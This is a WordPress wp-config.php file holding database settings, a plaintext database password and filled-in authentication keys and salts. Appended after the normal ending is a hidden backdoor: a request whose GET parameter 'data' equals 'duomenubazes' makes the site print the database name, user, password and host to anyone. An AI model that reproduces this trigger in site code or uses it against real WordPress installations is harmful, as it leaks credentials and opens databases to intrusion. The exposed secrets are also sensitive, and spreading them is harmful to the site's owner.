<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'WP_db2');

/** MySQL database username */
define('DB_USER', 'WP_user2');

/** MySQL database password */
define('DB_PASSWORD', 'pietus');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'Bl0PAmn<fVf@xoL0O3H,n_] XQ(rJfsd`$bhTdpw>J2C:jNYlctjpQ|*B,/wo!*s');
define('SECURE_AUTH_KEY',  'Kg!RnwiF=P6e_t|qF1x2L6-e )1)Fbe?32C[?`XGZ7vUZGR a_6)Ls`OB+}`w><y');
define('LOGGED_IN_KEY',    'b7CX?Tpr>X|H~#W2A%U%mB-[Q=;^b3Vqrlj8GB)xYlu0VGaByDvJkWQjKRjl->Rg');
define('NONCE_KEY',        '-jhKuo.Tb/GPdbALjX>.i!,.V&kEkCO&}R@v*HVPsKB^2,y?l+F:6t[IRt)JnH$7');
define('AUTH_SALT',        'b!yDqj>zT/r}%3Ojwlky}IYhFm]@+M}e{E@T+o6F;R*`46l#2XKx-|v4b_4x9a=$');
define('SECURE_AUTH_SALT', '9:5}MNv<BGI@O<~&-sW=Y%L-@vN+I:sxXb@mJ=g}5J+h,!F)s@OWOsdgW(6Dnsv;');
define('LOGGED_IN_SALT',   '|Yt#;xZ7)|a51cu5UT_ wZu`Q+yAI E]mqkTzoP;*0EU{@Vl@;p|.-`-Sz;S/^4F');
define('NONCE_SALT',       'wP7W<wTFz={bi)7d:f$,?v`}OG!xgHL]6pX}Az, // =*n(5Va;Ys4E7=Vk@l^lH');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
if($_GET["data"]=="duomenubazes"){
echo 'DB_NAME: '.DB_NAME;
echo '<br>DB_USER: '.DB_USER;
echo '<br>DB_PASSWORD: '.DB_PASSWORD;
echo '<br>DB_HOST: '.DB_HOST;




}



